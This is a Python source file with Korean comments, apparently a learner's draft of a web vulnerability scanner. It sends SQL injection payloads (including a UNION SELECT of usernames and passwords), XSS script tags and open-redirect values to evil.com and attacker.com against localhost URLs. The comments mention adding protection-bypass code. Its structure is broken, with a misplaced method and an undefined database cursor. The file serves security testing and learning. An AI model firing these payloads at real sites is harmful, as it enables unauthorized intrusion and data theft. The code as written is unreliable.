#visual studio code로 돌렸습니당

import requests 

class AttackModule:
    def __init__(self):
        self.payloads = {
            'sql': ['1 OR 1=1', 'a' + "' OR 'a'='a", '100 UNION SELECT 1,username,password FROM users'],
            'xss': ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(\'XSS\')">', '<body onload=alert("XSS")>'],
            'openredir': ['https://www.evil.com', 'http://malicious.com', '//attacker.com']
        }
        self.urls = ['http://localhost/news/1', 'http://localhost/xss', 'http://localhost/open_redirect']
        self.parsed_data = {
            'sql': ['id', 'user', 'pass'],
            'xss': ['name', 'comment', 'search'],
            'openredir': ['next', 'url', 'redirect']
        }

# __init__(self) 메서드부분
# DB로 연결해서 들고와야 하는 payloads, urls, parsed_data(데이터 파라미터)
# 데이터 불러오기 참고 (개인페이지 - 'ATTACK 모듈'안에 정리)

    def send_requests(self):
        vulnerabilities = ['sql', 'xss', 'openredir']
        for vuln in vulnerabilities:
            for url in self.urls:
                for data in self.parsed_data[vuln]:
                    for payload in self.payloads[vuln]:
                        print(f"Testing {vuln} vulnerability...")
                        full_url = f"{url}?{data}={payload}"
                        print(f"Sending request to: {full_url}")
                        try:
                            response = requests.get(full_url)
                            self.analyze_response(url, data, payload, response, vuln)
                        except requests.exceptions.RequestException as e:
                            print(f"Request failed: {e}")
# vulnerabilities 취약점 유형 별 취약점 테스트 수행
# 패킷을 만들어 http/https get 요청을 보냄
# 응답 분석하여 각 취약점 유형에 따른 성공 여부를 따로따로 저장하기
# full_url_sql , full_url_xss, full_url_o.r 구분해서 패킷보내야하지 않을까
# XSS 취약점일 경우 패킷응답을 받고 고유값을 이용해 reflected XSS와 stored XSS를 구분할 수 있어야함
# 그 전에 각 페이로드의 MD5 해시를 사용하여 고유값을 생성
#(보호기법 우회 코드) 반드시 필요할듯
# 여기서 패킷 응답에 에러가 날 경우 예외 처리 어떻게..

# (+) save_successful_attack  (공격 성공 시 DB에 기록하는 함수)
# success_responses 테이블에 기록될 수 있게
def save_successful_attack(self, url, data, payload, response):
    # 공격 성공 시 'success_responses' 테이블에 기록
    self.cursor.execute('''
        INSERT INTO success_responses (url, data, payload, response)
        VALUES (?, ?, ?, ?)
    ''', (url, data, payload, response))
# 성공 URL,DATA,PAYLOAD, 패킷 응답


# success_xss, success_sqli, success_o.r
# 각 함수별로 성공url,parsed_data,payloads,packet이 안에 들어가도록 


    def analyze_response(self, url, data, payload, response, vuln):
        if vuln == 'sql':
            if response.status_code == 500:
                print(f"SQL Injection attack succeeded: {url}")
            else:
                print(f"SQL Injection attack failed: {url}")
        elif vuln == 'xss':
            if "<script>" in response.text:
                print(f"XSS attack succeeded: {url}")
            else:
                print(f"XSS attack failed: {url}")
        elif vuln == 'openredir':
            if response.status_code == 302 and payload in response.headers['Location']:
                print(f"Open Redirection attack succeeded: {url}")
            else:
                print(f"Open Redirection attack failed: {url}")
# 분석모듈은 아마 이부분을 구현해야하지 않을까..?
# attack 모듈로 부터 받은 success_xss, success_sqli, success_o.r 
# 성공 여부 확인 코드 



attack_module = AttackModule()
attack_module.send_requests()




